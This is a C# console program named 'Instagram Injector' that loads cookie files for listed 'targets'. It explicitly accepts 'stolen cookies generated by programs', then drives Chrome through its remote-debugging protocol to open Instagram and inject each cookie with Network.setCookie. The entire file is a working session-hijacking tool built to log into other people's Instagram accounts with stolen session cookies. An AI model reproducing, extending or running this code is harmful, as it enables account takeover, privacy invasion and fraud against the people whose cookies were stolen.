using System;
using System.Text.Json;
using System.Threading;
using WebSocketSharp;
using System.Collections.Generic;
using System.Text;
using System.IO;

namespace IG_Injector.dev
{
    internal class Program
    {

        static string logo = @"
            _________ _______          _________ _       _________ _______  _______ _________ _______  _______ 
            \__   __/(  ____ \         \__   __/( (    /|\__    _/(  ____ \(  ____ \\__   __/(  ___  )(  ____ )
               ) (   | (    \/            ) (   |  \  ( |   )  (  | (    \/| (    \/   ) (   | (   ) || (    )|
               | |   | |                  | |   |   \ | |   |  |  | (__    | |         | |   | |   | || (____)|
               | |   | | ____             | |   | (\ \) |   |  |  |  __)   | |         | |   | |   | ||     __)
               | |   | | \_  )            | |   | | \   |   |  |  | (      | |         | |   | |   | || (\ (   
            ___) (___| (___) |         ___) (___| )  \  ||\_)  )  | (____/\| (____/\   | |   | (___) || ) \ \__
            \_______/(_______)         \_______/|/    )_)(____/   (_______/(_______/   )_(   (_______)|/   \__/

";

        static void Main(string[] args)
        {
            Console.Title = "Instagram Injector v1.0";

            WriteColoured(logo, ConsoleColor.Red);

            //Checking folders
            if (!Directory.Exists("database"))
            {
                Directory.CreateDirectory("database");
            }

            if (Directory.GetFiles("database").Length == 0)
            {
                WriteColoured("No target exists in database !", ConsoleColor.Red);
                Console.ReadKey();
                Environment.Exit(0);
            }

            Console.WriteLine("AVAILABLE TARGETS :\n");

            foreach(var cur in Directory.GetFiles("database"))
            {
                WriteColoured(Path.GetFileNameWithoutExtension(cur), ConsoleColor.Yellow);
            }

            Console.Write("\n\nEnter target's name : ");
            var target = Console.ReadLine();
            Console.Write("\n\nCOPYPASTE = Normal format when you copy paste cookies from browser\nCREAL = Stolen cookies generated by programs\n\nEnter data format : ");
            var format = Console.ReadLine();

            if (format != "COPYPASTE" && format != "CREAL")
            {
                WriteColoured("Invalid data format specified !", ConsoleColor.Red);
                Console.ReadKey();
                Environment.Exit(0);
            }

            if (!File.Exists("database\\" + target))
            {
                WriteColoured("Error !\nSpecified target doesn't exist.", ConsoleColor.Red);
                Console.ReadKey();
                Environment.Exit(0);
            }

            WriteColoured("\nReading target's session configuration...", ConsoleColor.Green);

            List<dynamic> cookies = new List<dynamic>();

            foreach (var cur in File.ReadAllLines("database\\" + target))
            {
                if (!String.IsNullOrEmpty(cur))
                {
                    var tabsplits = cur.Split('\t');

                    var _name = "";
                    var _value = "";
                    var _domain = "";
                    var _path = "";

                    if (format == "COPYPASTE")
                    {
                        //COPY PASTED STRUCTURE
                        _name = tabsplits[0];
                        _value = tabsplits[1];
                        _domain = tabsplits[2];
                        _path = tabsplits[3];
                    }
                    else
                    {
                        //CREAL GENERATED STRUCTURE
                        _name = tabsplits[5];
                        _value = tabsplits[6];
                        _domain = tabsplits[0];
                        _path = tabsplits[2];
                    }

                    cookies.Add(new {
                        name = _name,
                        value = _value,
                        url = "https://www.instagram.com",
                        domain = _domain,
                        path = _path,
                        secure = true,
                        httpOnly = false
                    });
                    
                }
            }

            // Launch Chrome with remote debugging enabled
            WriteColoured("Starting chrome...", ConsoleColor.Green);
            System.Diagnostics.Process.Start("chrome.exe", "--remote-debugging-port=9222 --user-data-dir=\"C:/ChromeDevProfile\"");

            // Give Chrome some time to start
            Thread.Sleep(3000);

            // Identify the WebSocket URL for the browser
            string browserWebSocketUrl = GetBrowserWebSocketUrl();

            if (string.IsNullOrEmpty(browserWebSocketUrl))
            {
                Console.WriteLine("Failed to find the browser WebSocket URL.");
                Console.ReadKey();
                Environment.Exit(0);
            }

            // Connect to the DevTools protocol
            WriteColoured("Connecting to Browser developer tools...", ConsoleColor.Green);
            using (var ws = new WebSocket(browserWebSocketUrl))
            {
                ws.OnMessage += (sender, e) =>
                {
                    Console.WriteLine("Received: " + e.Data);
                };

                ws.Connect();

                WriteColoured("Opening instagram.com...", ConsoleColor.Green);
                // Open Instagram
                var navigateCommand = new
                {
                    id = 1,
                    method = "Page.navigate",
                    @params = new
                    {
                        url = "https://www.instagram.com"
                    }
                };

                ws.Send(JsonSerializer.Serialize(navigateCommand));

                // Wait for the page to load
                Thread.Sleep(5000);

                WriteColoured("Injecting session details...", ConsoleColor.Green);
                int id = 2;
                foreach (var cookie in cookies)
                {
                    var command = new
                    {
                        id = id++,
                        method = "Network.setCookie",
                        @params = cookie
                    };

                    ws.Send(JsonSerializer.Serialize(command));
                    Thread.Sleep(500); // Slight delay to ensure commands are processed
                }
            }

            Console.WriteLine("\nPress any key to exit !");
            Console.ReadKey();
        }

        static void WriteColoured(string text, ConsoleColor color)
        {
            Console.ForegroundColor = color;
            Console.WriteLine(text);
            Console.ForegroundColor = ConsoleColor.White;
        }

        private static string GetBrowserWebSocketUrl()
        {
            using (var client = new System.Net.WebClient())
            {
                string json = client.DownloadString("http://localhost:9222/json");
                ChromeTab ct = new ChromeTab();
                ct.id = null;
                ct.webSocketDebuggerUrl = null;

                foreach(var cur in json.Split('\n'))
                {
                    if (ct.id == null && cur.Contains("\"id\": "))
                    {
                        ct.id = cur.Remove(0, cur.IndexOf("\"id\": ") + 6  );
                        ct.id = ct.id.Remove(0, 1);
                        ct.id = ct.id.Remove(ct.id.Length - 3, 2);
                    }

                    if (ct.webSocketDebuggerUrl == null && cur.Contains("\"webSocketDebuggerUrl\": "))
                    {
                        ct.webSocketDebuggerUrl = cur.Remove(0, cur.IndexOf("\"webSocketDebuggerUrl\": ") + 24);
                        ct.webSocketDebuggerUrl = ct.webSocketDebuggerUrl.Remove(0, 1);
                        ct.webSocketDebuggerUrl = ct.webSocketDebuggerUrl.Remove(ct.webSocketDebuggerUrl.Length - 2, 1);
                    }
                }

                return ct.webSocketDebuggerUrl;
            }
            return null;
        }

        class ChromeTab
        {
            public string id { get; set; }
            public string webSocketDebuggerUrl { get; set; }
        }
    }
}
